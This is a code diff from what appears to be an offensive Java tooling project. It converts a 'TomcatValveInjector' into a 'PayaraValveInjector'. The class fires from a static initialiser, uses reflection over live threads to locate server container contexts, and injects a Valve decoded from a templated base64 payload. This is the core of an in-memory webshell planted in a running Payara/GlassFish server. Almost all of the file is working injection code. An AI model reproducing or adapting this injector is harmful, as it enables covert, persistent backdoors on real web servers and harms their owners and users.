@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memsell.glassfish.godzilla;
+package com.reajason.javaweb.memsell.payara.injector;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -8,25 +8,19 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.HashMap;
 import java.util.List;
 import java.util.zip.GZIPInputStream;
 
 /**
- * Date: 2022/11/01
- * Author: pen4uin
- * Description: Tomcat Valve 注入器
- * Tested version：
- * jdk    v1.8.0_275
- * tomcat v8.5.83, v9.0.67
+ * @author ReaJason
  */
-public class TomcatValveInjector {
+public class PayaraValveInjector {
 
     static {
-        new TomcatValveInjector();
+        new PayaraValveInjector();
     }
 
-    public TomcatValveInjector() {
+    public PayaraValveInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
@@ -34,7 +28,6 @@ public class TomcatValveInjector {
                 if (valve == null) {
                     continue;
                 }
-                System.out.println(valve);
                 injectValve(context, valve);
             }
         } catch (Exception e) {
@@ -145,47 +138,20 @@ public class TomcatValveInjector {
         return "{{base64Str}}";
     }
 
-    @SuppressWarnings("all")
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
         List<Object> contexts = new ArrayList<Object>();
         Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        Object context = null;
         try {
             for (Thread thread : threads) {
-                // 适配 v5/v6/7/8
-                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
-                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
-                    // 原: map.get("localhost")
-                    // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
-                    for (Object key : childrenMap.keySet()) {
-                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
-                        // 原: context = children.get("");
-                        // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
-                        for (Object key1 : children.keySet()) {
-                            context = children.get(key1);
-                            if (context != null && context.getClass().getName().contains("StandardContext")) {
-                                contexts.add(context);
-                            }
-                            // 兼容 spring boot 2.x embedded tomcat
-                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
-                                contexts.add(context);
-                            }
-                        }
-                    }
-                }
-                // 适配 tomcat v9
-                else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
-                    if (context != null && context.getClass().getName().contains("StandardContext")) {
-                        contexts.add(context);
-                    }
-                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Object context = getFV(getFV(thread, "target"), "this$0");
+                    if (context != null) {
                         contexts.add(context);
                     }
                 }
             }
         } catch (Exception e) {
-            throw new RuntimeException(e);
+            e.printStackTrace();
         }
         return contexts;
     }
